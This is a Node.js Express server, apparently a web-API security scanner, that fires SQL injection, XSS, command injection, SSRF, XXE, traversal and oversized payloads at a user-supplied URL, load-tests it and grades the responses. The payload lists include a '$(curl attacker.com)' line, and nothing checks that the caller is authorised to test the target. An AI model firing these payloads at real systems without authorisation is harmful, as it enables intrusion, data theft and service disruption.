const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const autocannon = require("autocannon");
const rateLimit = require("express-rate-limit");

const app = express();
const PORT = process.env.PORT || 3000;

let activeTests = 0;
const MAX_ACTIVE_TESTS = 2; 

const runTestLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minuta
  max: 5,              // max 5 testova po minuti po IP
  message: { error: "Previše zahtjeva. Pokušaj kasnije." }
});

app.use(cors());
app.use(express.json({ limit: "100kb" }));

function sanitizeString(s, maxLen = 1024) {
  if (s === null || s === undefined) return "";
  if (typeof s !== "string") s = String(s);
  let t = s.replace(/\0/g, "").replace(/[\x00-\x1F\x7F]/g, "").trim();
  t = t.replace(/</g, "&lt;").replace(/>/g, "&gt;");
  if (t.length > maxLen) t = t.slice(0, maxLen);
  return t;
}

function sanitizeObject(obj, depth = 0) {
  if (depth > 5 || obj === null || obj === undefined) return obj;
  if (typeof obj === "string") return sanitizeString(obj, 2048);
  if (typeof obj === "number" || typeof obj === "boolean") return obj;
  if (Array.isArray(obj)) return obj.slice(0, 100).map((v) => sanitizeObject(v, depth + 1));
  if (typeof obj === "object") {
    const out = {};
    for (const k of Object.keys(obj)) {
      if (out && out[k] !== undefined) continue;
      try {
        out[k] = sanitizeObject(obj[k], depth + 1);
      } catch (e) {
        out[k] = null;
      }
    }
    return out;
  }
  return obj;
}

function isValidUrl(s) {
  try {
    const u = new URL(s);
    return ["http:", "https:"].includes(u.protocol) && s.length <= 2048;
  } catch (e) {
    return false;
  }
}
app.get("/health", (req, res) => res.json({ ok: true }));

const testsByMode = {
  query: [
    { type: "Query SQLi Boolean", value: "' OR '1'='1'--" },
    { type: "Query SQLi Union Extract", value: "' UNION SELECT null,version(),user()--" },
    { type: "Query SQLi Time Delay", value: "' AND SLEEP(5)--" },
    { type: "Query SQLi Conditional Delay", value: "' AND IF(1=1,SLEEP(5),0)--" },
    { type: "Query SQLi Heavy Query", value: "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--" },

    { type: "Query XSS Script", value: "<script>alert(document.domain)</script>" },
    { type: "Query XSS SVG Polyglot", value: "\"><svg/onload=alert(1)>" },
    { type: "Query XSS IMG OnError", value: "<img src=x onerror=alert(1)>" },
    { type: "Query XSS JS URI", value: "javascript:alert(document.cookie)" },
    { type: "Query XSS Data URI", value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" },

    { type: "Query Command Injection Semicolon", value: ";cat /etc/passwd" },
    { type: "Query Command Injection Subshell", value: "$(cat /etc/passwd)" },
    { type: "Query Command Injection Backticks", value: "`cat /etc/passwd`" },

    { type: "Query SSRF AWS Metadata", value: "http://169.254.169.254/latest/meta-data/" },
    { type: "Query SSRF Localhost", value: "http://127.0.0.1:22" },
    { type: "Query SSRF Admin Panel", value: "http://localhost:8080/admin" },

    { type: "Query LDAP Injection", value: "*)(uid=*))(|(uid=*" },
    { type: "Query Template Injection", value: "{{7*7}}" },
    { type: "Query Template Injection Advanced", value: "${{7*7}}" },

    { type: "Query NoSQL Injection", value: '{"$ne":null}' },
    { type: "Query NoSQL Regex", value: '{"$regex":".*"}' },

    { type: "Query Path Traversal", value: "../../../../../../etc/passwd" },
    { type: "Query Double Encoded Traversal", value: "..%252f..%252f..%252fetc%252fpasswd" },
    { type: "Query Unicode Traversal", value: "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" },

    { type: "Query CRLF Header Injection", value: "test%0d%0aX-Injected:true" },

    { type: "Query Protocol Smuggling", value: "gopher://127.0.0.1:11211/_stats" },

    { type: "Query Prototype Pollution", value: '{"__proto__":{"admin":true}}' },

    { type: "Query JSON Pollution", value: '{"role":"user","role":"admin"}' },

    { type: "Query Massive Length Stress", value: "A".repeat(50000) },
  ],

  path: [
    { type: "Path SQLi Boolean", value: "1' OR '1'='1'--" },
    { type: "Path SQLi Union", value: "1 UNION SELECT null,version(),null--" },
    { type: "Path SQLi Time", value: "1' AND SLEEP(5)--" },

    { type: "Path Command Injection", value: "id;whoami" },
    { type: "Path Command Pipe", value: "id|whoami" },
    { type: "Path Command Subshell", value: "$(whoami)" },

    { type: "Path Traversal Linux", value: "../../../../../../etc/passwd" },
    { type: "Path Traversal Windows", value: "..\\..\\..\\windows\\win.ini" },

    { type: "Path Double Encoded Traversal", value: "..%252f..%252f..%252fetc%252fpasswd" },
    { type: "Path Unicode Traversal", value: "%c0%ae%c0%ae%c0%afetc%c0%afpasswd" },

    { type: "Path Null Byte", value: "admin%00.json" },

    { type: "Path XSS Injection", value: "<svg/onload=alert(1)>" },

    { type: "Path Template Injection", value: "{{7*7}}" },

    { type: "Path SSRF Probe", value: "http://169.254.169.254/latest/meta-data/" },

    { type: "Path Overlong Segment", value: "X".repeat(8000) },

    { type: "Path Mixed Attack", value: "../../../../etc/passwd%00<script>alert(1)</script>" },
  ],

  body: [
    { type: "Body SQLi Auth Bypass", value: "admin' OR '1'='1'--" },
    { type: "Body SQLi Time Delay", value: "1' AND SLEEP(5)--" },
    { type: "Body SQLi Union Dump", value: "' UNION SELECT null,version(),database()--" },

    { type: "Body XSS Script", value: "<script>alert(document.cookie)</script>" },
    { type: "Body XSS SVG Polyglot", value: "\"><svg/onload=alert(1)>" },

    { type: "Body Template Injection", value: "{{constructor.constructor('alert(1)')()}}" },

    { type: "Body Command Injection", value: "test;cat /etc/passwd" },
    { type: "Body Bash Injection", value: "$(curl attacker.com)" },

    { type: "Body CRLF Header Injection", value: "test\r\nSet-Cookie:admin=true" },

    { type: "Body JSON Breakout", value: "\"},\"role\":\"admin\",\"x\":\"" },

    { type: "Body Prototype Pollution", value: '{"__proto__":{"isAdmin":true}}' },

    { type: "Body NoSQL Injection", value: '{"username":{"$ne":null}}' },

    { type: "Body XXE Injection", value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" },

    { type: "Body XML Bomb", value: "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol1;</lolz>" },

    { type: "Body Massive JSON", value: JSON.stringify({ data: "A".repeat(60000) }) },

    { type: "Body Zip Bomb Marker", value: "PK".repeat(10000) },
  ],

  form: [
    { type: "Form SQLi Union", value: "test' UNION SELECT null,version()--" },
    { type: "Form SQLi Boolean", value: "' OR '1'='1'--" },
    { type: "Form SQLi Time Delay", value: "';WAITFOR DELAY '0:0:5'--" },

    { type: "Form XSS Polyglot", value: "\"><svg/onload=alert(1)>" },
    { type: "Form XSS Image", value: "<img src=x onerror=alert(1)>" },

    { type: "Form Template Injection", value: "{{7*7}}" },
    { type: "Form SSTI Advanced", value: "{{constructor.constructor('alert(1)')()}}" },

    { type: "Form Command Injection", value: "name=test;whoami" },
    { type: "Form Bash Injection", value: "$(whoami)" },

    { type: "Form Traversal", value: "../../../../etc/passwd" },

    { type: "Form Null Byte", value: "avatar.png%00.jpg" },

    { type: "Form CRLF Injection", value: "test%0d%0aX-Evil:1" },

    { type: "Form Protocol Smuggling", value: "gopher://127.0.0.1:11211/_stats" },

    { type: "Form Massive Input", value: "Z".repeat(50000) },
  ],
};

function chooseMode(method, endpointContext) {
  const hasQuery = (endpointContext?.queryParams || []).length > 0;
  const hasPath = Object.keys(endpointContext?.pathParamValues || {}).length > 0;
  const hasForm = (endpointContext?.formDataParams || []).length > 0;
  const hasBody = Boolean(endpointContext?.bodyTemplate) || (endpointContext?.bodyFields || []).length > 0;

  if (hasForm) return "form";
  if (hasBody && method !== "GET" && method !== "DELETE") return "body";
  if (hasQuery) return "query";
  if (hasPath) return "path";
  return method === "GET" || method === "DELETE" ? "query" : "body";
}

function resolvePath(path, pathParams) {
  return path.replace(/\{([^}]+)\}/g, (_, key) => encodeURIComponent(pathParams[key] || "test"));
}

function joinUrl(baseUrl, path) {
  const cleanBase = String(baseUrl || "").replace(/\/+$/, "");
  const cleanPath = String(path || "").startsWith("/") ? String(path) : `/${String(path)}`;
  return `${cleanBase}${cleanPath}`;
}

function buildUrl(baseUrl, path, queryParams, value, forceProbeParam = false) {
  const target = new URL(joinUrl(baseUrl, path));
  const params = Array.isArray(queryParams) ? queryParams.slice(0, 20) : [];
  if (params.length === 0 && forceProbeParam) params.push("__probe");
  if (params.length === 0) return target.toString();
  const payloadValue = typeof value === "string" ? value : JSON.stringify(value);
  params.forEach((name) => target.searchParams.set(name, payloadValue));
  return target.toString();
}

function deepClone(value) {
  return value === null || value === undefined ? value : JSON.parse(JSON.stringify(value));
}

function setByPath(obj, path, value) {
  if (!obj || !path) return;
  const keys = path.split(".");
  let cursor = obj;
  for (let i = 0; i < keys.length - 1; i++) {
    const key = keys[i];
    if (!cursor[key] || typeof cursor[key] !== "object") cursor[key] = {};
    cursor = cursor[key];
  }
  cursor[keys[keys.length - 1]] = value;
}

function buildMultipartBody(formParams, value) {
  const boundary = `----codex-boundary-${Date.now()}`;
  const lines = [];
  const fields = formParams || [];
  fields.forEach((field, idx) => {
    const currentValue = sanitizeString(idx === 0 ? value : "test", 4096);
    const safeName = sanitizeString(field?.name || "field", 128).replace(/[^a-zA-Z0-9_\-\.]/g, "_");
    lines.push(`--${boundary}`);
    if (field.type === "file") {
      lines.push(`Content-Disposition: form-data; name="${safeName}"; filename="test.txt"`);
      lines.push("Content-Type: text/plain");
      lines.push("");
      lines.push(String(currentValue));
    } else {
      lines.push(`Content-Disposition: form-data; name="${safeName}"`);
      lines.push("");
      lines.push(String(currentValue));
    }
  });
  lines.push(`--${boundary}--`, "");
  return { body: lines.join("\r\n"), contentType: `multipart/form-data; boundary=${boundary}` };
}

function buildRequest(method, mode, testValue, endpointContext) {
  const options = { method, headers: { "Content-Type": "application/json" } };
  if (mode === "form") {
    const form = buildMultipartBody(endpointContext?.formDataParams || [], testValue);
    options.headers["Content-Type"] = form.contentType;
    options.body = form.body;
    return options;
  }

  if (mode === "body" && method !== "GET" && method !== "DELETE") {
    const template = deepClone(endpointContext?.bodyTemplate);
    if (template && typeof template === "object" && !Array.isArray(template)) {
      const fieldPath = endpointContext?.injectFieldPath || endpointContext?.bodyFields?.[0] || null;
      setByPath(template, fieldPath, testValue);
      options.body = JSON.stringify(template);
    } else {
      const field = endpointContext?.bodyFields?.[0];
      options.body = JSON.stringify(field ? { [field]: testValue } : testValue);
    }
  }

  return options;
}

function normalizeBody(text) {
  return String(text || "").replace(/\s+/g, " ").trim().slice(0, 5000);
}

function safeDecode(value) {
  try {
    return decodeURIComponent(String(value || ""));
  } catch (e) {
    return String(value || "");
  }
}

function escapeForHtmlProbe(value) {
  return String(value || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function looksReflected(responseText, value) {
  const body = String(responseText || "");
  if (!body) return false;
  const raw = String(value || "");
  const decoded = safeDecode(raw);
  const htmlEscaped = escapeForHtmlProbe(raw);
  const htmlEscapedDecoded = escapeForHtmlProbe(decoded);
  return [raw, decoded, htmlEscaped, htmlEscapedDecoded]
    .filter((v) => v && v.length > 0)
    .some((candidate) => body.includes(candidate));
}

function looksEscapedReflection(responseText, value) {
  const body = String(responseText || "");
  if (!body) return false;
  const raw = String(value || "");
  const decoded = safeDecode(raw);
  const escapedRaw = escapeForHtmlProbe(raw);
  const escapedDecoded = escapeForHtmlProbe(decoded);
  const hasRaw = [raw, decoded].filter((v) => v && v.length > 0).some((v) => body.includes(v));
  const hasEscaped = [escapedRaw, escapedDecoded].filter((v) => v && v.length > 0).some((v) => body.includes(v));
  return !hasRaw && hasEscaped;
}

function hasSqlErrorMarkers(responseText) {
  const text = String(responseText || "").toLowerCase();
  const markers = [
    "sql syntax",
    "syntax error",
    "mysql",
    "postgres",
    "sqlstate",
    "ora-",
    "odbc",
    "sqlite error",
    "unclosed quotation mark",
  ];
  return markers.some((m) => text.includes(m));
}

function isExplicitBlockStatus(statusCode) {
  return [400, 401, 403, 404, 405, 406, 409, 410, 411, 412, 413, 414, 415, 416, 422, 429, 431].includes(Number(statusCode));
}

function hasTimeInjectionMarker(value) {
  const s = String(value || "").toLowerCase();
  return s.includes("sleep(") || s.includes("waitfor delay") || s.includes("pg_sleep(") || s.includes("benchmark(");
}

function buildVerdict({ status, findingType, severity, note, message }) {
  return { status, findingType, severity, note, message };
}

function hasSuspiciousMarkers(value) {
  const s = String(value || "").toLowerCase();
  const patterns = [
    /(\bor\b|\band\b)\s+\d=\d/,
    /union\s+select/,
    /drop\s+table/,
    /waitfor\s+delay/,
    /<script|onerror=|onload=|javascript:/,
    /\.\.\/|%2e%2e%2f|%252f/,
    /\$ne|\$gt|\$regex/,
    /%00|\x00/,
    /\{\{.*\}\}|\$\{.*\}/,
    /\r\n|%0d%0a/,
    /cat\s+\/etc\/passwd|whoami|cmd\.exe|powershell/,
  ];
  return patterns.some((re) => re.test(s));
}

function classify2xxWithBaseline({ response, responseText, baseline, method, value, elapsedMs }) {
  if (!baseline) {
    return buildVerdict({
      status: "Inconclusive",
      findingType: "Unclassified Behavior",
      severity: "Informational",
      note: "Nema baseline poredenja za preciznu klasifikaciju 2xx odgovora.",
      message: "Rezultat je neodredjen bez referentnog odgovora.",
    });
  }

  const currentStatus = Number(response.status);
  const baselineStatus = Number(baseline.statusCode);
  const sameStatus = currentStatus === baselineStatus;
  const sameBody = normalizeBody(baseline.text) === normalizeBody(responseText);
  const writeMethod = ["POST", "PUT", "PATCH"].includes(String(method || "").toUpperCase());
  const suspicious = hasSuspiciousMarkers(value);
  const baselineMs = Number(baseline.elapsedMs || 0);
  const isTimeProbe = hasTimeInjectionMarker(value);
  const suspiciousDelay = isTimeProbe && elapsedMs > Math.max(4000, baselineMs + 2500);

  if (sameStatus && sameBody) {
    return buildVerdict({
      status: "Passed",
      findingType: "Input Ignored / Safe Handling",
      severity: "Low",
      note: "Nema eksplicitnog odbijanja, ali odgovor je identican baseline-u.",
      message: "Payload je najvjerovatnije ignorisan i nije pokazao opasnu obradu.",
    });
  }

  if (!sameStatus && baselineStatus >= 200 && baselineStatus < 300 && isExplicitBlockStatus(currentStatus)) {
    return buildVerdict({
      status: "Passed",
      findingType: "Request Blocked",
      severity: "Low",
      note: `Server je presao sa baseline statusa ${baselineStatus} na eksplicitno odbijanje ${currentStatus}.`,
      message: "Payload je prepoznat i blokiran.",
    });
  }

  if (suspiciousDelay) {
    return buildVerdict({
      status: "Failed",
      findingType: "Confirmed Vulnerability",
      severity: "Critical",
      note: `Moguca time-based injekcija (odziv ${elapsedMs} ms, baseline ${baselineMs} ms).`,
      message: "Payload sa vremenskom injekcijom je izazvao znacajno kasnjenje.",
    });
  }

  if (writeMethod && suspicious) {
    return buildVerdict({
      status: "Failed",
      findingType: "Possible Vulnerability",
      severity: "Medium",
      note: "Sumnjiv payload je promijenio write odgovor bez jasnog blokiranja.",
      message: "POST/PUT/PATCH je obradio rizican unos i vratio izmijenjen odgovor.",
    });
  }

  return buildVerdict({
    status: "Inconclusive",
    findingType: "Reflected/Changed Response",
    severity: "Informational",
    note: "Odgovor se razlikuje od baseline-a bez jasnog signala blokiranja ili exploita.",
    message: "Potrebna je dodatna validacija logova ili poslovne logike endpointa.",
  });
}

function evaluate({ value, response, responseText, baseline, method, elapsedMs }) {
  const methodName = String(method || "").toUpperCase();
  if (!response) return buildVerdict({ status: "Failed", findingType: "Transport Error", severity: "Medium", note: "Nema odgovora servera.", message: "Server nije odgovorio." });
  if (response.status >= 500) return buildVerdict({ status: "Failed", findingType: "Server Error", severity: "High", note: "Server je pao (5xx).", message: "Server error - payload izazvao gresku." });
  if (isExplicitBlockStatus(response.status)) return buildVerdict({ status: "Passed", findingType: "Request Blocked", severity: "Low", note: `Server je eksplicitno odbio payload (${response.status}).`, message: "Payload blokiran, zastita radi." });
  if (response.status >= 400 && response.status < 500) return buildVerdict({ status: "Passed", findingType: "Request Blocked", severity: "Low", note: `Server je odbio payload (${response.status}).`, message: "Payload blokiran." });
  if (response.status >= 300 && response.status < 400) {
    const redirectVerdict = ["POST", "PUT", "PATCH"].includes(methodName) ? "Inconclusive" : "Passed";
    return buildVerdict({
      status: redirectVerdict,
      findingType: redirectVerdict === "Passed" ? "Redirect Handling" : "Unclassified Redirect",
      severity: "Informational",
      note: `Server je vratio redirect (${response.status}).`,
      message: redirectVerdict === "Passed"
        ? "Payload nije direktno prihvacen kao uspjesan input."
        : "Potrebno je provjeriti redirect destinaciju i backend tok.",
    });
  }
  if (response.status >= 200 && response.status < 300) {
    if (hasSqlErrorMarkers(responseText)) {
      return buildVerdict({
        status: "Failed",
        findingType: "Possible Vulnerability",
        severity: "Medium",
        note: "Detektovani SQL error markeri u odgovoru.",
        message: "Odgovor sadrzi poruke koje ukazuju na mogucu SQL injekciju.",
      });
    }

    if (looksReflected(responseText, value)) {
      return buildVerdict({
        status: "Inconclusive",
        findingType: "Reflected Input",
        severity: "Informational",
        note: "Payload je reflektovan u odgovoru.",
        message: "Input je vracen u response; bez dodatnih dokaza ovo nije automatski exploit.",
      });
    }
    if (looksEscapedReflection(responseText, value)) {
      return buildVerdict({
        status: "Inconclusive",
        findingType: "Escaped Reflection",
        severity: "Informational",
        note: "Payload je reflektovan ali escaped u odgovoru.",
        message: "Moguca bezbjedna refleksija (output escaping), bez direktne potvrde exploita.",
      });
    }
    return classify2xxWithBaseline({ response, responseText, baseline, method: methodName, value, elapsedMs });
  }
  return buildVerdict({ status: "Failed", findingType: "Unexpected Response", severity: "Medium", note: `Neocekivan status (${response.status}).`, message: "Neispravan odgovor servera." });
}

function runAutocannon(options) {
  return new Promise((resolve, reject) => {
    autocannon(options, (err, res) => {
      if (err) reject(err);
      else {
        res.errors = res.errors || 0;
        res.timeouts = res.timeouts || 0;
        res.latency = res.latency || {};
        res.requests = res.requests || {};
        res.throughput = res.throughput || {};
        res.bytes = res.bytes || {};
        res["1xx"] = res["1xx"] || 0;
        res["2xx"] = res["2xx"] || 0;
        res["3xx"] = res["3xx"] || 0;
        res["4xx"] = res["4xx"] || 0;
        res["5xx"] = res["5xx"] || 0;
        resolve(res);
      }
    });
  });
}

function pickPhrase(list, seed) {
  if (!Array.isArray(list) || list.length === 0) return "";
  return list[Math.abs(seed) % list.length];
}

function generateAnalysisSummary({ summary, performance, findings }) {
  const failed = Number(summary?.failed || 0);
  const inconclusive = Number(summary?.inconclusive || 0);
  const total = Number(summary?.totalTests || 0);
  const securityScore = Number(summary?.securityScore || 0);
  const avgLatency = Number(performance?.avgLatencyMs || 0);
  const p99 = Number(performance?.latencyP99 || 0);
  const reqPerSec = Number(performance?.requestsPerSec || 0);
  const errorCount = Number(performance?.errorCount || 0);
  const totalRequests = Number(performance?.totalRequests || 0);
  const errorRate = totalRequests > 0 ? ((errorCount / totalRequests) * 100) : 0;
  const findingsList = Array.isArray(findings) ? findings : [];
  const failedRatio = total > 0 ? failed / total : 0;
  const inconclusiveRatio = total > 0 ? inconclusive / total : 0;

  let securityRiskLevel = "Low";
  if (failedRatio >= 0.5) securityRiskLevel = "High";
  else if (failedRatio > 0 || inconclusiveRatio > 0 || securityScore < 100) securityRiskLevel = "Medium";

  // securityLevel prikazuje jacinu zastite (High = dobra sigurnost, Low = slaba sigurnost)
  let securityLevel = "High";
  if (securityRiskLevel === "High") securityLevel = "Low";
  else if (securityRiskLevel === "Medium") securityLevel = "Medium";

  let performanceLevel = "Good";
  if (p99 >= 1200 || errorRate >= 1.0) performanceLevel = "Poor";
  else if (p99 >= 500 || avgLatency >= 250 || reqPerSec < 10) performanceLevel = "Moderate";

  let priority = "Nizak";
  if (securityRiskLevel === "High" || performanceLevel === "Poor") priority = "Visok";
  else if (securityRiskLevel === "Medium" || performanceLevel === "Moderate") priority = "Srednji";

  const failedByType = {
    sql: findingsList.filter((f) => f?.status === "Failed" && /sqli|sql/i.test(String(f?.testType || ""))).length,
    xss: findingsList.filter((f) => f?.status === "Failed" && /xss|script|html/i.test(String(f?.testType || ""))).length,
    overlong: findingsList.filter((f) => f?.status === "Failed" && /overlong|long|traversal|path/i.test(String(f?.testType || ""))).length,
  };

  const seed = failed * 13 + Math.round(p99) + Math.round(reqPerSec * 3);
  const headline = pickPhrase(
    securityRiskLevel === "High"
      ? [
          "Detektovan je visok sigurnosni rizik endpointa",
          "Rezultati ukazuju na kriticne slabosti zastite ulaza",
          "Endpoint zahtijeva hitan sigurnosni hardening",
        ]
      : securityRiskLevel === "Medium"
      ? [
          "Detektovan je srednji sigurnosni rizik endpointa",
          "Postoje sigurnosne slabosti koje treba sanirati",
          "Endpoint trazi dodatno ucvrscivanje validacije",
        ]
      : [
          "Sigurnosni profil endpointa je stabilan",
          "Nisu detektovana kriticna sigurnosna odstupanja",
          "Endpoint prolazi definisane sigurnosne provjere",
        ],
    seed
  );

  const dominantVector = failedByType.sql >= failedByType.xss && failedByType.sql >= failedByType.overlong
    ? "SQLi"
    : failedByType.xss >= failedByType.overlong
    ? "XSS"
    : "Overlong/Traversal";

  const securityAssessment =
    failedRatio >= 0.66
      ? pickPhrase(
          [
            `Vecina sigurnosnih testova je pala (${failed}/${total}), sto ukazuje na nedovoljnu validaciju i sanitizaciju unosa.`,
            `Fail stopa je visoka (${failed}/${total}), a dominantni rizik dolazi iz kategorije ${dominantVector}.`,
            `Endpoint trenutno prihvata rizicne payload-e (${failed}/${total} fail), pa je potrebna hitna korekcija kontrola unosa.`,
          ],
          seed + failedByType.sql + failedByType.xss
        )
      : failedRatio === 0 && inconclusiveRatio > 0
      ? pickPhrase(
          [
            `Nema direktnog pada testova, ali ${inconclusive}/${total} rezultata je neodredjeno i zahtijeva dodatnu provjeru.`,
            `Detektovani su neodredjeni ishodi (${inconclusive}/${total}), bez jasnog dokaza blokiranja ili exploita.`,
            `Rezultat je djelimicno neodredjen (${inconclusive}/${total}), pa su potrebne dodatne backend provjere.`,
          ],
          seed + 9
        )
      : failedRatio > 0
      ? pickPhrase(
          [
            `Dio sigurnosnih testova nije prosao (${failed}/${total}); preporucena je ciljna dorada validacije ulaza.`,
            `Detektovane su parcijalne slabosti (${failed}/${total} fail), bez potpunog kompromisa svih testova.`,
            `Rezultat je mjesovit (${failed}/${total}); endpoint je funkcionalan, ali ima konkretne sigurnosne rupe.`,
          ],
          seed + 5
        )
      : pickPhrase(
          [
            "Sigurnosni rezultat je dobar: nisu uocena odstupanja u pokrivenim scenarijima testiranja.",
            "Endpoint je odbio testirane rizicne obrasce i zadrzao dobar sigurnosni profil.",
            "Osnovne sigurnosne kontrole djeluju pouzdano i rezultat ukazuje na dobru sigurnost endpointa.",
          ],
          seed + 3
        );

  const performanceAssessment =
    performanceLevel === "Poor"
      ? pickPhrase(
          [
            `Performanse su nestabilne pod opterecenjem (P99 ${p99.toFixed(0)} ms), sa izrazenim kasnim odzivom.`,
            `Uocena je degradacija odziva pri vrhu opterecenja; tail latency je povisena.`,
            `Profil performansi je slabiji za vrsne zahtjeve i trazi optimizaciju obrade.`,
          ],
          seed + 11
        )
      : performanceLevel === "Moderate"
      ? pickPhrase(
          [
            "Performanse su prihvatljive uz povremene oscilacije, pa je preporucen kontinuiran monitoring.",
            "Servis je stabilan za osnovni load, ali postoji prostor za bolji P99 odziv.",
            "Nema kriticnih gresaka, ali je preporucen tuning za ujednaceniji odziv.",
          ],
          seed + 17
        )
      : pickPhrase(
          [
            "Performanse su stabilne i konzistentne za trenutni profil opterecenja.",
            "Odziv servisa je uredan, bez znacajne degradacije tokom testa.",
            "Nema indikacije ozbiljnog uskog grla u performansama za ovaj scenario.",
          ],
          seed + 23
        );

  const recommendations = [];
  if (failedByType.sql > 0) recommendations.push("Prioritet 1: uvesti striktne server-side validacije i schema enforcement za query/body parametre.");
  if (failedByType.xss > 0) recommendations.push("Prioritet 1: onemoguciti refleksiju nestrukturisanog unosa i primijeniti output escaping.");
  if (failedByType.overlong > 0) recommendations.push("Prioritet 2: postaviti limit velicine payload-a i filtrirati traversal obrasce.");
  if (inconclusive > 0) recommendations.push("Prioritet 2: pregledati backend logove i pravila validacije za neodredjene test ishode.");
  if (performanceLevel !== "Good" && failed > 0) recommendations.push("Prioritet 2: optimizovati kriticne rute radi smanjenja P99 latencije.");
  if (performanceLevel !== "Good" && failed === 0) recommendations.push("Opcionalno: optimizovati P99 latenciju radi stabilnijeg odziva pod opterecenjem.");
  if (recommendations.length === 0) recommendations.push("Zadrzati postojece kontrole i nastaviti periodican security/performance retest.");

  const conclusion = pickPhrase(
    priority === "Visok"
      ? [
          "Preporucena je hitna korekcija prije sire upotrebe endpointa.",
          "Potreban je prioritetan remediation plan prije produkcijskog koristenja.",
          "Endpoint nije spreman za produkciju bez dodatnih zastitnih mjera.",
        ]
      : failed === 0 && inconclusive === 0
      ? [
          "Sigurnost endpointa je dobra za pokrivene test scenarije; preporucen je redovan monitoring.",
          "Endpoint pokazuje dobar sigurnosni profil uz nastavak periodicnog testiranja.",
          "Rezultat je dobar i upotrebljiv uz standardne operativne kontrole.",
        ]
      : failed === 0 && inconclusive > 0
      ? [
          "Nema direktnih sigurnosnih padova, ali neodredjeni ishodi zahtijevaju dodatnu verifikaciju.",
          "Rezultat je umjereno pouzdan; preporucen je pregled logova i dopunski retest.",
          "Endpoint je potencijalno stabilan, ali neodredjeni signali traze dublju provjeru.",
        ]
      : [
          "Stanje je upotrebljivo uz redovan monitoring i periodican retest.",
          "Endpoint je stabilan uz preporuku kontinuiranog testiranja.",
          "Rezultat je prihvatljiv za testno okruzenje uz standardne kontrole.",
        ],
    seed + 7
  );

  const summaryText = `${headline}. ${securityAssessment} ${performanceAssessment} ${conclusion}`;

  return {
    headline,
    priority,
    securityLevel,
    performanceLevel,
    securityAssessment,
    performanceAssessment,
    recommendations: recommendations.slice(0, 3),
    conclusion,
    summary: summaryText,
  };
}

app.post("/run-test", runTestLimiter, async (req, res) => {
  if (activeTests >= MAX_ACTIVE_TESTS) {
    return res.status(429).json({
      error: "Previše aktivnih testova. Pokušaj kasnije."
    });
  }

  activeTests++;

  try {
    const raw = req.body || {};
    const baseUrl = sanitizeString(raw.baseUrl || "", 2048);
    const path = sanitizeString(raw.path || "", 1024);
    const method = sanitizeString(raw.method || "", 10).toUpperCase();
    const endpointContext = sanitizeObject(raw.endpointContext || {});

    if (!baseUrl || !path || !method) return res.status(400).json({ error: "Nedostaju parametri" });
    if (!isValidUrl(baseUrl)) return res.status(400).json({ error: "Nevalidan baseUrl" });
    if (!["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"].includes(method)) return res.status(400).json({ error: "Nevalidna metoda" });

    const normalizedMethod = method.toUpperCase();
    const mode = chooseMode(normalizedMethod, endpointContext);
    const tests = testsByMode[mode] || testsByMode.body;
    const basePathParams = endpointContext?.pathParamValues || {};
    const defaultPath = resolvePath(path, basePathParams);
    const baseTargetUrl = joinUrl(baseUrl, defaultPath);
    const queryNames = mode === "query" ? (endpointContext?.queryParams || []) : [];
    const useProbeQuery = mode === "query" && queryNames.length === 0;
    const results = [];

    let baseline = null;
    try {
      const baselineUrl = buildUrl(baseUrl, defaultPath, queryNames, "test", useProbeQuery);
      const baselineOptions = buildRequest(normalizedMethod, mode, "test", endpointContext);
      const baselineStartedAt = Date.now();
      const baselineResponse = await fetch(baselineUrl, baselineOptions);
      const baselineText = await baselineResponse.text().catch(() => "");
      baseline = { statusCode: baselineResponse.status, text: baselineText, elapsedMs: Date.now() - baselineStartedAt };
    } catch (e) {
      baseline = null;
    }

    for (const test of tests) {
      try {
        const pathValues = { ...basePathParams };
        if (mode === "path") {
          const firstPathKey = Object.keys(pathValues)[0];
          if (firstPathKey) pathValues[firstPathKey] = test.value;
        }

        const resolvedPath = resolvePath(path, pathValues);
        const targetUrl = buildUrl(baseUrl, resolvedPath, queryNames, test.value, useProbeQuery);
        const options = buildRequest(normalizedMethod, mode, test.value, endpointContext);
        const startedAt = Date.now();
        const response = await fetch(targetUrl, options);
        const text = await response.text().catch(() => "");
        const elapsedMs = Date.now() - startedAt;
        const verdict = evaluate({
          value: test.value,
          response,
          responseText: text,
          baseline,
          method: normalizedMethod,
          elapsedMs,
        });

        results.push({
          type: test.type,
          payload: test.value,
          status: verdict.status,
          findingType: verdict.findingType || null,
          severity: verdict.severity || null,
          note: verdict.note,
          response: { message: verdict.message, raw: text, statusCode: response.status },
          timestamp: new Date().toISOString(),
          url: targetUrl,
          method: normalizedMethod,
          elapsedMs,
        });
      } catch (err) {
        results.push({
          type: test.type,
          payload: test.value,
          status: "Failed",
          findingType: "Transport Error",
          severity: "Medium",
          note: "Greska pri konekciji ili obradi payload-a.",
          response: { message: err.message, raw: "", statusCode: null },
          timestamp: new Date().toISOString(),
          url: baseTargetUrl,
          method: normalizedMethod,
          elapsedMs: null,
        });
      }
    }

    const firstTest = tests[0] || { value: "test" };
    const loadPathValues = { ...basePathParams };
    if (mode === "path") {
      const firstPathKey = Object.keys(loadPathValues)[0];
      if (firstPathKey) loadPathValues[firstPathKey] = firstTest.value;
    }

    const loadResolvedPath = resolvePath(path, loadPathValues);
    const loadTargetUrl = buildUrl(
      baseUrl,
      loadResolvedPath,
      queryNames,
      firstTest.value,
      useProbeQuery
    );

    const options = buildRequest(normalizedMethod, mode, firstTest.value, endpointContext);
    const loadOpts = {
      url: loadTargetUrl,
      method: normalizedMethod,
      connections: 10,
      amount: 200,
      timeout: 10,
      headers: options.headers || {},
      body: options.body || undefined,
    };

    let load;
    try {
      load = await runAutocannon(loadOpts);
    } catch (err) {
      load = { latency: {}, requests: {}, throughput: {}, bytes: {}, errors: 1, timeouts: 0 };
    }

    const passed = results.filter((item) => item.status === "Passed").length;
    const failed = results.filter((item) => item.status === "Failed").length;
